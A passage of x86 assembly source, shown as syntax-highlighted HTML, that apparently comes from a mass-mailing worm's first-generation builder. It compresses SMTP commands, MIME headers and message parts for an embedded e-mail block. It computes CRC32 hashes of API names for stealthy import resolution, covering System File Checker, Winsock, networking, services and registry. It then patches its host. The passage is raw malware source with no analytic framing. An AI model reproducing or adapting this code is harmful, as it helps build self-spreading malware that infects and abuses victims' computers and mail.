        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalAlloc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp1</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;smtp1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;smtp2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;smtp3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;smtp4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;header1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;header2</span><span class="sc0">

</span><span class="sc9">ife</span><span class="sc0"> </span><span class="sc5">compress_only</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">email_block</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401000h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">patch_mime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc9">endif</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;header31</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;header32</span><span class="sc0">

</span><span class="sc9">ife</span><span class="sc0"> </span><span class="sc5">compress_only</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">email_block</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401000h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">patch_type</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc9">endif</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part11</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part12</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part13</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;body1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part21</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part22</span><span class="sc0">

</span><span class="sc9">ife</span><span class="sc0"> </span><span class="sc5">compress_only</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">email_block</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401000h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">patch_encode</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc9">endif</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part23</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part24</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part25</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part26</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part27</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part28</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part31</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part41</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">compmain</span><span class="sc0">                        </span><span class="sc1">;part42</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">compress_only</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part43</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalAlloc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dump_line</span><span class="sc0">

</span><span class="sc5">dump_outer</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">','</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dump_inner</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">dump_line</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc3">"bd"</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">dump_inner</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"0 "</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">aam</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">byt2asc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'h'</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">dump_outer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalFree</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fn_dump</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalFree</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">txttitle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">txtbody</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">fn_dump</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"email.inc"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">byt2asc</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">nyb2asc</span><span class="sc0">

</span><span class="sc5">nyb2asc</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">69h</span><span class="sc0">
        </span><span class="sc6">das</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">nyb2asc</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">byt2asc</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">else</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalFree</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">expcrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">expnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">expcrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">regcrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regcrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">execrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exenames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">execrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">usrcrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">usrnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">usrcrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">svccrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">svcnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">svccrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">krncrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">krnnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">krncrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sfccrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sfcnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sfccrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ws2crc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ws2names</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ws2crcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">netcrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netcrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ip9xcrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip9xnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip9xcrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ipntcrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ipntnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ipntcrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patch_host</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">txttitle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">txtbody</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">create_crcs</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">create_loop</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">create_outer</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">create_inner</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">create_skip</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4c11db7h</span><span class="sc0">                   </span><span class="sc1">;use generator polymonial (see IEEE 802)</span><span class="sc0">

</span><span class="sc5">create_skip</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">create_inner</span><span class="sc0">
